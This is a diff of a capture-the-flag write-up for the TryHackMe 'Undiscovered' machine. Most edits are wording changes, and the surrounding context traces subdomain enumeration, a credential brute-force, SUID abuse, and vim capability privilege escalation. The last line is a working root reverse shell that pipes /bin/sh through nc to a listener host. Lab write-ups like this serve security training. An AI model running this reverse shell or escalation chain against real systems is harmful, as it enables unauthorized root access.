@@ -86,7 +86,7 @@ The web server landing page shows what seems an hint message.
 
 ![image.png](/assets/images/thm-undiscovered/image.png)
 
-Trying a directory bruteforce lead to nothing, so I tried with a subdomain enumeration.
+Trying a directory bruteforce led to nothing, so I tried with a subdomain enumeration.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine]
@@ -217,7 +217,7 @@ To avoid wasting time, I made a small Python script that tests each subdomain qu
 [-] FAILURE: http://start.undiscovered.thm/cms (404)
 ```
 
-So I continued with deliver subdomain. The `/cms` endpoint of this subdomain effectively shows a login page.
+So I continued with `deliver` subdomain. The `/cms` endpoint of this subdomain effectively shows a login page.
 
 ![image.png](/assets/images/thm-undiscovered/image%204.png)
 
@@ -305,7 +305,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-18 11:45:
 
 # Exploitation
 
-After loggin in with the compromised credentials, we are able to use the previously found exploit.
+After loggin in with the compromised credentials, I was able to use the previously found exploit.
 
 ![image.png](/assets/images/thm-undiscovered/image%206.png)
 
@@ -352,7 +352,7 @@ bash: cd: william/: Permission denied
 
 # PrivEsc
 
-The first thing we have to do is an horizontal privilege escalation, because our current user (`www-data`) has no privilege on the target machine.
+The first thing I had to do was an horizontal privilege escalation, because user `www-data` has no privilege on the target machine.
 
 ## William
 
@@ -482,7 +482,7 @@ william@undiscovered:~$ ./script
 william@undiscovered:~$
 ```
 
-As reported above, `script` binary executes commands from `admin.sh`. In addition, `script` has SUID set as user `leonard`, so every command launched by `script` is executed as `leonard`. Unluckily, `william` do not have any write permission on `admin.sh`, so he cannot change its content. I started 
+As reported above, `script` binary executes commands from `admin.sh`. In addition, `script` has SUID set as user `leonard`, so every command launched by `script` is executed as `leonard`. Unluckily, `william` do not have any write permission on `admin.sh`, so I cannot change its content. I started a more detailed analysis about the file by transfering it on my local machine.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine]
@@ -511,7 +511,7 @@ Once decompiled, the binary shows that `admin.sh` is called through a `system` f
 
 ![image.png](/assets/images/thm-undiscovered/image%207.png)
 
-So I tried to pass an argument to the script and it prints what reported below.
+So I tried to pass an argument to the script and it prints out the following result.
 
 ```
 william@undiscovered:~$ ./script AA
@@ -633,7 +633,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 leonard@undiscovered:~$
 ```
 
-Enumerating the capabilities, I found an entry for `vim`. In addition, inside the `leonard` home directory there is also a suspicious `.viminfo` file.
+Enumerating the capabilities, I found an entry for `vim.basic`. In addition, inside the `leonard` home directory there is a suspicious `.viminfo` file.
 
 ```
 leonard@undiscovered:~$ getcap -r / 2>/dev/null
@@ -758,9 +758,9 @@ leonard@undiscovered:~$
 
 ```
 
-After searching online, I found that the Python command reported multiple times in `.viminfo` file, in addition with a `cap_setuid` on `vim.basic` binary, is a common vector of privilege escalation. 
+After searching online, I found that the Python command reported multiple times in `.viminfo` file, in addition with a `cap_setuid` on `vim.basic` binary, is a common privilege escalation vector. 
 
-So, I tried to execute the reverse shell command after setting up a listener.
+So, I tried to execute the reverse shell command after setting up a listener and obtained a shell as `root`.
 
 ```
 leonard@undiscovered:~$ vim.basic -c ':py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.105 4444 >/tmp/f")'
